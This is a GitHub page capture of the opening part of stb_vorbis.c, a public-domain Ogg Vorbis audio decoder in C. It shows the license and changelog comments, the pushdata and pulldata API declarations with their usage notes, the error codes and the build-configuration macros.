=== Content from github.com_77bc3392_20250111_170025.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_vorbis.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_vorbis.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nothings%2Fstb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nothings](/nothings)
/
**[stb](/nothings/stb)**
Public

* [Notifications](/login?return_to=%2Fnothings%2Fstb) You must be signed in to change notification settings
* [Fork
  7.7k](/login?return_to=%2Fnothings%2Fstb)
* [Star
   27.5k](/login?return_to=%2Fnothings%2Fstb)

* [Code](/nothings/stb)
* [Issues
  158](/nothings/stb/issues)
* [Pull requests
  131](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects
  0](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

Additional navigation options

* [Code](/nothings/stb)
* [Issues](/nothings/stb/issues)
* [Pull requests](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

## Files

 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_vorbis.c

Copy path Blame  Blame
## Latest commit

## History

[History](/nothings/stb/commits/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)5584 lines (4959 loc) · 188 KB 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_vorbis.c

Top
## File metadata and controls

* Code
* Blame

5584 lines (4959 loc) · 188 KB[Raw](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000// Ogg Vorbis audio decoder - v1.22 - public domain// http://nothings.org/stb\_vorbis///// Original version written by Sean Barrett in 2007.//// Originally sponsored by RAD Game Tools. Seeking implementation// sponsored by Phillip Bennefall, Marc Andersen, Aaron Baker,// Elias Software, Aras Pranckevicius, and Sean Barrett.//// LICENSE//// See end of file for license information.//// Limitations://// - floor 0 not supported (used in old ogg vorbis files pre-2004)// - lossless sample-truncation at beginning ignored// - cannot concatenate multiple vorbis streams// - sample positions are 32-bit, limiting seekable 192Khz// files to around 6 hours (Ogg supports 64-bit)//// Feature contributors:// Dougall Johnson (sample-exact seeking)//// Bugfix/warning contributors:// Terje Mathisen Niklas Frykholm Andy Hill// Casey Muratori John Bolton Gargaj// Laurent Gomila Marc LeBlanc Ronny Chevalier// Bernhard Wodo Evan Balster github:alxprd// Tom Beaumont Ingo Leitgeb Nicolas Guillemot// Phillip Bennefall Rohit Thiago Goulart// github:manxorist Saga Musix github:infatum// Timur Gagiev Maxwell Koo Peter Waller// github:audinowho Dougall Johnson David Reid// github:Clownacy Pedro J. Estebanez Remi Verschelde// AnthoFoxo github:morlat Gabriel Ravier//// Partial history:// 1.22 - 2021-07-11 - various small fixes// 1.21 - 2021-07-02 - fix bug for files with no comments// 1.20 - 2020-07-11 - several small fixes// 1.19 - 2020-02-05 - warnings// 1.18 - 2020-02-02 - fix seek bugs; parse header comments; misc warnings etc.// 1.17 - 2019-07-08 - fix CVE-2019-13217..CVE-2019-13223 (by ForAllSecure)// 1.16 - 2019-03-04 - fix warnings// 1.15 - 2019-02-07 - explicit failure if Ogg Skeleton data is found// 1.14 - 2018-02-11 - delete bogus dealloca usage// 1.13 - 2018-01-29 - fix truncation of last frame (hopefully)// 1.12 - 2017-11-21 - limit residue begin/end to blocksize/2 to avoid large temp allocs in bad/corrupt files// 1.11 - 2017-07-23 - fix MinGW compilation// 1.10 - 2017-03-03 - more robust seeking; fix negative ilog(); clear error in open\_memory// 1.09 - 2016-04-04 - back out 'truncation of last frame' fix from previous version// 1.08 - 2016-04-02 - warnings; setup memory leaks; truncation of last frame// 1.07 - 2015-01-16 - fixes for crashes on invalid files; warning fixes; const// 1.06 - 2015-08-31 - full, correct support for seeking API (Dougall Johnson)// some crash fixes when out of memory or with corrupt files// fix some inappropriately signed shifts// 1.05 - 2015-04-19 - don't define \_\_forceinline if it's redundant// 1.04 - 2014-08-27 - fix missing const-correct case in API// 1.03 - 2014-08-07 - warning fixes// 1.02 - 2014-07-09 - declare qsort comparison as explicitly \_cdecl in Windows// 1.01 - 2014-06-18 - fix stb\_vorbis\_get\_samples\_float (interleaved was correct)// 1.0 - 2014-05-26 - fix memory leaks; fix warnings; fix bugs in >2-channel;// (API change) report sample rate for decode-full-file funcs//// See end of file for full version history.
////////////////////////////////////////////////////////////////////////////////// HEADER BEGINS HERE//
#ifndef STB\_VORBIS\_INCLUDE\_STB\_VORBIS\_H#define STB\_VORBIS\_INCLUDE\_STB\_VORBIS\_H
#if defined(STB\_VORBIS\_NO\_CRT) && !defined(STB\_VORBIS\_NO\_STDIO)#define STB\_VORBIS\_NO\_STDIO 1#endif
#ifndef STB\_VORBIS\_NO\_STDIO#include <stdio.h>#endif
#ifdef \_\_cplusplusextern "C" {#endif
/////////// THREAD SAFETY
// Individual stb\_vorbis\* handles are not thread-safe; you cannot decode from// them from multiple threads at the same time. However, you can have multiple// stb\_vorbis\* handles and decode from them independently in multiple thrads.
/////////// MEMORY ALLOCATION
// normally stb\_vorbis uses malloc() to allocate memory at startup,// and alloca() to allocate temporary memory during a frame on the// stack. (Memory consumption will depend on the amount of setup// data in the file and how you set the compile flags for speed// vs. size. In my test files the maximal-size usage is ~150KB.)//// You can modify the wrapper functions in the source (setup\_malloc,// setup\_temp\_malloc, temp\_malloc) to change this behavior, or you// can use a simpler allocation model: you pass in a buffer from// which stb\_vorbis will allocate \_all\_ its memory (including the// temp memory). "open" may fail with a VORBIS\_outofmem if you// do not pass in enough data; there is no way to determine how// much you do need except to succeed (at which point you can// query get\_info to find the exact amount required. yes I know// this is lame).//// If you pass in a non-NULL buffer of the type below, allocation// will occur from it as described above. Otherwise just pass NULL// to use malloc()/alloca()
typedef struct{ char \*alloc\_buffer; int alloc\_buffer\_length\_in\_bytes;} stb\_vorbis\_alloc;
/////////// FUNCTIONS USEABLE WITH ALL INPUT MODES
typedef struct stb\_vorbis stb\_vorbis;
typedef struct{ unsigned int sample\_rate; int channels;
 unsigned int setup\_memory\_required; unsigned int setup\_temp\_memory\_required; unsigned int temp\_memory\_required;
 int max\_frame\_size;} stb\_vorbis\_info;
typedef struct{ char \*vendor;
 int comment\_list\_length; char \*\*comment\_list;} stb\_vorbis\_comment;
// get general information about the fileextern stb\_vorbis\_info stb\_vorbis\_get\_info(stb\_vorbis \*f);
// get ogg commentsextern stb\_vorbis\_comment stb\_vorbis\_get\_comment(stb\_vorbis \*f);
// get the last error detected (clears it, too)extern int stb\_vorbis\_get\_error(stb\_vorbis \*f);
// close an ogg vorbis file and free all memory in useextern void stb\_vorbis\_close(stb\_vorbis \*f);
// this function returns the offset (in samples) from the beginning of the// file that will be returned by the next decode, if it is known, or -1// otherwise. after a flush\_pushdata() call, this may take a while before// it becomes valid again.// NOT WORKING YET after a seek with PULLDATA APIextern int stb\_vorbis\_get\_sample\_offset(stb\_vorbis \*f);
// returns the current seek point within the file, or offset from the beginning// of the memory buffer. In pushdata mode it returns 0.extern unsigned int stb\_vorbis\_get\_file\_offset(stb\_vorbis \*f);
/////////// PUSHDATA API
#ifndef STB\_VORBIS\_NO\_PUSHDATA\_API
// this API allows you to get blocks of data from any source and hand// them to stb\_vorbis. you have to buffer them; stb\_vorbis will tell// you how much it used, and you have to give it the rest next time;// and stb\_vorbis may not have enough data to work with and you will// need to give it the same data again PLUS more. Note that the Vorbis// specification does not bound the size of an individual frame.
extern stb\_vorbis \*stb\_vorbis\_open\_pushdata( const unsigned char \* datablock, int datablock\_length\_in\_bytes, int \*datablock\_memory\_consumed\_in\_bytes, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create a vorbis decoder by passing in the initial data block containing// the ogg&vorbis headers (you don't need to do parse them, just provide// the first N bytes of the file--you're told if it's not enough, see below)// on success, returns an stb\_vorbis \*, does not set error, returns the amount of// data parsed/consumed on this call in \*datablock\_memory\_consumed\_in\_bytes;// on failure, returns NULL on error and sets \*error, does not change \*datablock\_memory\_consumed// if returns NULL and \*error is VORBIS\_need\_more\_data, then the input block was// incomplete and you need to pass in a larger block from the start of the file
extern int stb\_vorbis\_decode\_frame\_pushdata( stb\_vorbis \*f, const unsigned char \*datablock, int datablock\_length\_in\_bytes, int \*channels, // place to write number of float \* buffers float \*\*\*output, // place to write float \*\* array of float \* buffers int \*samples // place to write number of output samples );// decode a frame of audio sample data if possible from the passed-in data block//// return value: number of bytes we used from datablock//// possible cases:// 0 bytes used, 0 samples output (need more data)// N bytes used, 0 samples output (resynching the stream, keep going)// N bytes used, M samples output (one frame of data)// note that after opening a file, you will ALWAYS get one N-bytes,0-sample// frame, because Vorbis always "discards" the first frame.//// Note that on resynch, stb\_vorbis will rarely consume all of the buffer,// instead only datablock\_length\_in\_bytes-3 or less. This is because it wants// to avoid missing parts of a page header if they cross a datablock boundary,// without writing state-machiney code to record a partial detection.//// The number of channels returned are stored in \*channels (which can be// NULL--it is always the same as the number of channels reported by// get\_info). \*output will contain an array of float\* buffers, one per// channel. In other words, (\*output)[0][0] contains the first sample from// the first channel, and (\*output)[1][0] contains the first sample from// the second channel.//// \*output points into stb\_vorbis's internal output buffer storage; these// buffers are owned by stb\_vorbis and application code should not free// them or modify their contents. They are transient and will be overwritten// once you ask for more data to get decoded, so be sure to grab any data// you need before then.
extern void stb\_vorbis\_flush\_pushdata(stb\_vorbis \*f);// inform stb\_vorbis that your next datablock will not be contiguous with// previous ones (e.g. you've seeked in the data); future attempts to decode// frames will cause stb\_vorbis to resynchronize (as noted above), and// once it sees a valid Ogg page (typically 4-8KB, as large as 64KB), it// will begin decoding the \_next\_ frame.//// if you want to seek using pushdata, you need to seek in your file, then// call stb\_vorbis\_flush\_pushdata(), then start calling decoding, then once// decoding is returning you data, call stb\_vorbis\_get\_sample\_offset, and// if you don't like the result, seek your file again and repeat.#endif
////////// PULLING INPUT API
#ifndef STB\_VORBIS\_NO\_PULLDATA\_API// This API assumes stb\_vorbis is allowed to pull data from a source--// either a block of memory containing the \_entire\_ vorbis stream, or a// FILE \* that you or it create, or possibly some other reading mechanism// if you go modify the source to replace the FILE \* case with some kind// of callback to your code. (But if you don't support seeking, you may// just want to go ahead and use pushdata.)
#if !defined(STB\_VORBIS\_NO\_STDIO) && !defined(STB\_VORBIS\_NO\_INTEGER\_CONVERSION)extern int stb\_vorbis\_decode\_filename(const char \*filename, int \*channels, int \*sample\_rate, short \*\*output);#endif#if !defined(STB\_VORBIS\_NO\_INTEGER\_CONVERSION)extern int stb\_vorbis\_decode\_memory(const unsigned char \*mem, int len, int \*channels, int \*sample\_rate, short \*\*output);#endif// decode an entire file and output the data interleaved into a malloc()ed// buffer stored in \*output. The return value is the number of samples// decoded, or -1 if the file could not be opened or was not an ogg vorbis file.// When you're done with it, just free() the pointer returned in \*output.
extern stb\_vorbis \* stb\_vorbis\_open\_memory(const unsigned char \*data, int len, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create an ogg vorbis decoder from an ogg vorbis stream in memory (note// this must be the entire stream!). on failure, returns NULL and sets \*error
#ifndef STB\_VORBIS\_NO\_STDIOextern stb\_vorbis \* stb\_vorbis\_open\_filename(const char \*filename, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create an ogg vorbis decoder from a filename via fopen(). on failure,// returns NULL and sets \*error (possibly to VORBIS\_file\_open\_failure).
extern stb\_vorbis \* stb\_vorbis\_open\_file(FILE \*f, int close\_handle\_on\_close, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer);// create an ogg vorbis decoder from an open FILE \*, looking for a stream at// the \_current\_ seek point (ftell). on failure, returns NULL and sets \*error.// note that stb\_vorbis must "own" this stream; if you seek it in between// calls to stb\_vorbis, it will become confused. Moreover, if you attempt to// perform stb\_vorbis\_seek\_\*() operations on this file, it will assume it// owns the \_entire\_ rest of the file after the start point. Use the next// function, stb\_vorbis\_open\_file\_section(), to limit it.
extern stb\_vorbis \* stb\_vorbis\_open\_file\_section(FILE \*f, int close\_handle\_on\_close, int \*error, const stb\_vorbis\_alloc \*alloc\_buffer, unsigned int len);// create an ogg vorbis decoder from an open FILE \*, looking for a stream at// the \_current\_ seek point (ftell); the stream will be of length 'len' bytes.// on failure, returns NULL and sets \*error. note that stb\_vorbis must "own"// this stream; if you seek it in between calls to stb\_vorbis, it will become// confused.#endif
extern int stb\_vorbis\_seek\_frame(stb\_vorbis \*f, unsigned int sample\_number);extern int stb\_vorbis\_seek(stb\_vorbis \*f, unsigned int sample\_number);// these functions seek in the Vorbis file to (approximately) 'sample\_number'.// after calling seek\_frame(), the next call to get\_frame\_\*() will include// the specified sample. after calling stb\_vorbis\_seek(), the next call to// stb\_vorbis\_get\_samples\_\* will start with the specified sample. If you// do not need to seek to EXACTLY the target sample when using get\_samples\_\*,// you can also use seek\_frame().
extern int stb\_vorbis\_seek\_start(stb\_vorbis \*f);// this function is equivalent to stb\_vorbis\_seek(f,0)
extern unsigned int stb\_vorbis\_stream\_length\_in\_samples(stb\_vorbis \*f);extern float stb\_vorbis\_stream\_length\_in\_seconds(stb\_vorbis \*f);// these functions return the total length of the vorbis stream
extern int stb\_vorbis\_get\_frame\_float(stb\_vorbis \*f, int \*channels, float \*\*\*output);// decode the next frame and return the number of samples. the number of// channels returned are stored in \*channels (which can be NULL--it is always// the same as the number of channels reported by get\_info). \*output will// contain an array of float\* buffers, one per channel. These outputs will// be overwritten on the next call to stb\_vorbis\_get\_frame\_\*.//// You generally should not intermix calls to stb\_vorbis\_get\_frame\_\*()// and stb\_vorbis\_get\_samples\_\*(), since the latter calls the former.
#ifndef STB\_VORBIS\_NO\_INTEGER\_CONVERSIONextern int stb\_vorbis\_get\_frame\_short\_interleaved(stb\_vorbis \*f, int num\_c, short \*buffer, int num\_shorts);extern int stb\_vorbis\_get\_frame\_short (stb\_vorbis \*f, int num\_c, short \*\*buffer, int num\_samples);#endif// decode the next frame and return the number of \*samples\* per channel.// Note that for interleaved data, you pass in the number of shorts (the// size of your array), but the return value is the number of samples per// channel, not the total number of samples.//// The data is coerced to the number of channels you request according to the// channel coercion rules (see below). You must pass in the size of your// buffer(s) so that stb\_vorbis will not overwrite the end of the buffer.// The maximum buffer size needed can be gotten from get\_info(); however,// the Vorbis I specification implies an absolute maximum of 4096 samples// per channel.
// Channel coercion rules:// Let M be the number of channels requested, and N the number of channels present,// and Cn be the nth channel; let stereo L be the sum of all L and center channels,// and stereo R be the sum of all R and center channels (channel assignment from the// vorbis spec).// M N output// 1 k sum(Ck) for all k// 2 \* stereo L, stereo R// k l k > l, the first l channels, then 0s// k l k <= l, the first k channels// Note that this is not \_good\_ surround etc. mixing at all! It's just so// you get something useful.
extern int stb\_vorbis\_get\_samples\_float\_interleaved(stb\_vorbis \*f, int channels, float \*buffer, int num\_floats);extern int stb\_vorbis\_get\_samples\_float(stb\_vorbis \*f, int channels, float \*\*buffer, int num\_samples);// gets num\_samples samples, not necessarily on a frame boundary--this requires// buffering so you have to supply the buffers. DOES NOT APPLY THE COERCION RULES.// Returns the number of samples stored per channel; it may be less than requested// at the end of the file. If there are no more samples in the file, returns 0.
#ifndef STB\_VORBIS\_NO\_INTEGER\_CONVERSIONextern int stb\_vorbis\_get\_samples\_short\_interleaved(stb\_vorbis \*f, int channels, short \*buffer, int num\_shorts);extern int stb\_vorbis\_get\_samples\_short(stb\_vorbis \*f, int channels, short \*\*buffer, int num\_samples);#endif// gets num\_samples samples, not necessarily on a frame boundary--this requires// buffering so you have to supply the buffers. Applies the coercion rules above// to produce 'channels' channels. Returns the number of samples stored per channel;// it may be less than requested at the end of the file. If there are no more// samples in the file, returns 0.
#endif
//////// ERROR CODES
enum STBVorbisError{ VORBIS\_\_no\_error,
 VORBIS\_need\_more\_data=1, // not a real error
 VORBIS\_invalid\_api\_mixing, // can't mix API modes VORBIS\_outofmem, // not enough memory VORBIS\_feature\_not\_supported, // uses floor 0 VORBIS\_too\_many\_channels, // STB\_VORBIS\_MAX\_CHANNELS is too small VORBIS\_file\_open\_failure, // fopen() failed VORBIS\_seek\_without\_length, // can't seek in unknown-length file
 VORBIS\_unexpected\_eof=10, // file is truncated? VORBIS\_seek\_invalid, // seek past EOF
 // decoding errors (corrupt/invalid stream) -- you probably // don't care about the exact details of these
 // vorbis errors: VORBIS\_invalid\_setup=20, VORBIS\_invalid\_stream,
 // ogg errors: VORBIS\_missing\_capture\_pattern=30, VORBIS\_invalid\_stream\_structure\_version, VORBIS\_continued\_packet\_flag\_invalid, VORBIS\_incorrect\_stream\_serial\_number, VORBIS\_invalid\_first\_page, VORBIS\_bad\_packet\_type, VORBIS\_cant\_find\_last\_page, VORBIS\_seek\_failed, VORBIS\_ogg\_skeleton\_not\_supported};
#ifdef \_\_cplusplus}#endif
#endif // STB\_VORBIS\_INCLUDE\_STB\_VORBIS\_H//// HEADER ENDS HERE////////////////////////////////////////////////////////////////////////////////
#ifndef STB\_VORBIS\_HEADER\_ONLY
// global configuration settings (e.g. set these in the project/makefile),// or just set them in this file at the top (although ideally the first few// should be visible when the header file is compiled too, although it's not// crucial)
// STB\_VORBIS\_NO\_PUSHDATA\_API// does not compile the code for the various stb\_vorbis\_\*\_pushdata()// functions// #define STB\_VORBIS\_NO\_PUSHDATA\_API
// STB\_VORBIS\_NO\_PULLDATA\_API// does not compile the code for the non-pushdata APIs// #define STB\_VORBIS\_NO\_PULLDATA\_API
// STB\_VORBIS\_NO\_STDIO// does not compile the code for the APIs that use FILE \*s internally// or externally (implied by STB\_VORBIS\_NO\_PULLDATA\_API)// #define STB\_VORBIS\_NO\_STDIO
// STB\_VORBIS\_NO\_INTEGER\_CONVERSION// does not compile the code for converting audio sample data from// float to integer (implied by STB\_VORBIS\_NO\_PULLDATA\_API)// #define STB\_VORBIS\_NO\_INTEGER\_CONVERSION
// STB\_VORBIS\_NO\_FAST\_SCALED\_FLOAT// does not use a fast float-to-int trick to accelerate float-to-int on// most platforms which requires endianness be defined correctly.//#define STB\_VORBIS\_NO\_FAST\_SCALED\_FLOAT
// STB\_VORBIS\_MAX\_CHANNELS [number]// globally define this to the maximum number of channels you need.// The spec does not put a restriction on channels except that// the count is stored in a byte, so 255 is the hard limit.// Reducing this saves about 16 bytes per value, so using 16 saves// (255-16)\*16 or around 4KB. Plus anything other memory usage// I forgot to account for. Can probably go as low as 8 (7.1 audio),// 6 (5.1 audio), or 2 (stereo only).#ifndef STB\_VORBIS\_MAX\_CHANNELS#define STB\_VORBIS\_MAX\_CHANNELS 16 // enough for anyone?#endif
// STB\_VORBIS\_PUSHDATA\_CRC\_COUNT [number]// after a flush\_pushdata(), stb\_vorbis begins scanning for the// next valid page, without backtracking. when it finds something// that looks like a page, it streams through it and verifies its// CRC32. Should that validation fail, it keeps scanning. But it's// possible that \_while\_ streaming through to check the CRC32 of// one candidate page, it sees another candidate page. This #define// determines how many "overlapping" candidate pages it can search// at once. Note that "real" pages are typically ~4KB to ~8KB, whereas// garbage pages could be as big as 64KB, but probably average ~16KB.// So don't hose ourselves by scanning an apparent 64KB page and// missing a ton of real ones in the interim; so minimum of 2#ifndef STB\_VORBIS\_PUSHDATA\_CRC\_COUNT#define STB\_VORBIS\_PUSHDATA\_CRC\_COUNT 4#endif
// STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH [number]// sets the log size of the huffman-acceleration table. Maximum// supported value is 24. with larger numbers, more decodings are O(1),// but the table size is larger so worse cache missing, so you'll have// to probe (and try multiple ogg vorbis files) to find the sweet spot.#ifndef STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH#define STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH 10#endif
// STB\_VORBIS\_FAST\_BINARY\_LENGTH [number]// sets the log size of the binary-search acceleration table. this// is used in similar fashion to the fast-huffman size to set initial// parameters for the binary search
// STB\_VORBIS\_FAST\_HUFFMAN\_INT// The fast huffman tables are much more efficient if they can be// stored as 16-bit results instead of 32-bit results. This restricts// the codebooks to having only 65535 possible outcomes, though.// (At least, accelerated by the huffman table.)#ifndef STB\_VORBIS\_FAST\_HUFFMAN\_INT#define STB\_VORBIS\_FAST\_HUFFMAN\_SHORT#endif
// STB\_VORBIS\_NO\_HUFFMAN\_BINARY\_SEARCH// If the 'fast huffman' search doesn't succeed, then stb\_vorbis falls// back on binary searching for the correct one. This requires storing// extra tables with the huffman codes in sorted order. Defining this// symbol trades off space for speed by forcing a linear search in the// non-fast case, except for "sparse" codebooks.// #define STB\_VORBIS\_NO\_HUFFMAN\_BINARY\_SEARCH
// STB\_VORBIS\_DIVIDES\_IN\_RESIDUE// stb\_vorbis precomputes the result of the scalar residue decoding// that would otherwise require a divide per chunk. you can trade off// space for time by defining this symbol.// #define STB\_VORBIS\_DIVIDES\_IN\_RESIDUE
// STB\_VORBIS\_DIVIDES\_IN\_CODEBOOK// vorbis VQ codebooks can be encoded two ways: with every case explicitly// stored, or with all elements being chosen from a small range of values,// and all values possible in all elements. By default, stb\_vorbis expands// this latter kind out to look like the former kind for ease of decoding,// because otherwise an integer divide-per-vector-element is required to// unpack the index. If you define STB\_VORBIS\_DIVIDES\_IN\_CODEBOOK, you can// trade off storage for speed.//#define STB\_VORBIS\_DIVIDES\_IN\_CODEBOOK
#ifdef STB\_VORBIS\_CODEBOOK\_SHORTS#error "STB\_VORBIS\_CODEBOOK\_SHORTS is no longer supported as it produced incorrect results for some input formats"#endif
// STB\_VORBIS\_DIVIDE\_TABLE// this replaces small integer divides in the floor decode loop with// table lookups. made less than 1% difference, so disabled by default.
// STB\_VORBIS\_NO\_INLINE\_DECODE// disables the inlining of the scalar codebook fast-huffman decode.// might save a little codespace; useful for debugging// #define STB\_VORBIS\_NO\_INLINE\_DECODE
// STB\_VORBIS\_NO\_DEFER\_FLOOR// Normally we only decode the floor without synthesizing the actual// full curve. We can instead synthesize the curve immediately. This// requires more memory and is very likely slower, so I don't think// you'd ever want to do it except for debugging.// #define STB\_VORBIS\_NO\_DEFER\_FLOOR
//////////////////////////////////////////////////////////////////////////////
#ifdef STB\_VORBIS\_NO\_PULLDATA\_API #define STB\_VORBIS\_NO\_INTEGER\_CONVERSION #define STB\_VORBIS\_NO\_STDIO#endif
#if defined(STB\_VORBIS\_NO\_CRT) && !defined(STB\_VORBIS\_NO\_STDIO) #define STB\_VORBIS\_NO\_STDIO 1#endif
#ifndef STB\_VORBIS\_NO\_INTEGER\_CONVERSION#ifndef STB\_VORBIS\_NO\_FAST\_SCALED\_FLOAT
 // only need endianness for fast-float-to-int, which we don't // use for pushdata
 #ifndef STB\_VORBIS\_BIG\_ENDIAN #define STB\_VORBIS\_ENDIAN 0 #else #define STB\_VORBIS\_ENDIAN 1 #endif
#endif#endif
#ifndef STB\_VORBIS\_NO\_STDIO#include <stdio.h>#endif
#ifndef STB\_VORBIS\_NO\_CRT #include <stdlib.h> #include <string.h> #include <assert.h> #include <math.h>
 // find definition of alloca if it's not in stdlib.h: #if defined(\_MSC\_VER) || defined(\_\_MINGW32\_\_) #include <malloc.h> #endif #if defined(\_\_linux\_\_) || defined(\_\_linux) || defined(\_\_sun\_\_) || defined(\_\_EMSCRIPTEN\_\_) || defined(\_\_NEWLIB\_\_) #include <alloca.h> #endif#else // STB\_VORBIS\_NO\_CRT #define NULL 0 #define malloc(s) 0 #define free(s) ((void) 0) #define realloc(s) 0#endif // STB\_VORBIS\_NO\_CRT
#include <limits.h>
#ifdef \_\_MINGW32\_\_ // eff you mingw: // "fixed": // http://sourceforge.net/p/mingw-w64/mailman/message/32882927/ // "no that broke the build, reverted, who cares about C": // http://sourceforge.net/p/mingw-w64/mailman/message/32890381/ #ifdef \_\_forceinline #undef \_\_forceinline #endif #define \_\_forceinline #ifndef alloca #define alloca \_\_builtin\_alloca #endif#elif !defined(\_MSC\_VER) #if \_\_GNUC\_\_ #define \_\_forceinline inline #else #define \_\_forceinline #endif#endif
#if STB\_VORBIS\_MAX\_CHANNELS > 256#error "Value of STB\_VORBIS\_MAX\_CHANNELS outside of allowed range"#endif
#if STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH > 24#error "Value of STB\_VORBIS\_FAST\_HUFFMAN\_LENGTH outside of allowed range"#endif
